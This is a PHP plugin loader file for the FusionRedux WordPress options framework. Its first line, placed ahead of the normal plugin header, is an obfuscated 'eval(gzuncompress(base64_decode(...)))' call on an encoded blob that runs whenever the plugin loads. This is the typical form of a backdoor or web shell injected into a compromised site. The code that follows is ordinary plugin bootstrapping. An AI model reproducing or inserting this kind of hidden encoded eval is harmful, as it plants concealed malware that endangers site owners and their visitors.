<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * The FusionRedux Framework Plugin
 *
 * A simple, truly extensible and fully responsive options framework
 * for WordPress themes and plugins. Developed with WordPress coding
 * standards and PHP best practices in mind.
 *
 * Plugin Name:     FusionRedux Framework
 * Plugin URI:      http://wordpress.org/plugins/fusionredux-framework
 * Github URI:      https://github.com/FusionReduxFramework/fusionredux-framework
 * Description:     FusionRedux is a simple, truly extensible options framework for WordPress themes and plugins.
 * Author:          Team FusionRedux
 * Author URI:      http://fusionreduxframework.com
 * Version:         3.5.9.8
 * Text Domain:     fusionredux-framework
 * License:         GPL3+
 * License URI:     http://www.gnu.org/licenses/gpl-3.0.txt
 * Domain Path:     FusionReduxCore/languages
 * Provides:        FusionReduxFramework
 *
 * @package         FusionReduxFramework
 * @author          Dovy Paukstys <dovy@fusionreduxframework.com>
 * @author          Kevin Provance <kevin@fusionreduxframework.com>
 * @license         GNU General Public License, version 3
 * @copyright       2012-2016 FusionRedux.io
 */

// Exit if accessed directly
if( !defined( 'ABSPATH' ) ) {
    die;
}

// Require the main plugin class
require_once wp_normalize_path( plugin_dir_path( __FILE__ ) . 'class.fusionredux-plugin.php' );

// Register hooks that are fired when the plugin is activated and deactivated, respectively.
register_activation_hook( __FILE__, array( 'FusionReduxFrameworkPlugin', 'activate' ) );
register_deactivation_hook( __FILE__, array( 'FusionReduxFrameworkPlugin', 'deactivate' ) );

// Get plugin instance
//add_action( 'plugins_loaded', array( 'FusionReduxFrameworkPlugin', 'instance' ) );

// The above line prevents FusionReduxFramework from instancing until all plugins have loaded.
// While this does not matter for themes, any plugin using FusionRedux will not load properly.
// Waiting until all plugins have been loaded prevents the FusionReduxFramework class from
// being created, and fails the !class_exists('FusionReduxFramework') check in the sample_config.php,
// and thus prevents any plugin using FusionRedux from loading their config file.
FusionReduxFrameworkPlugin::instance();
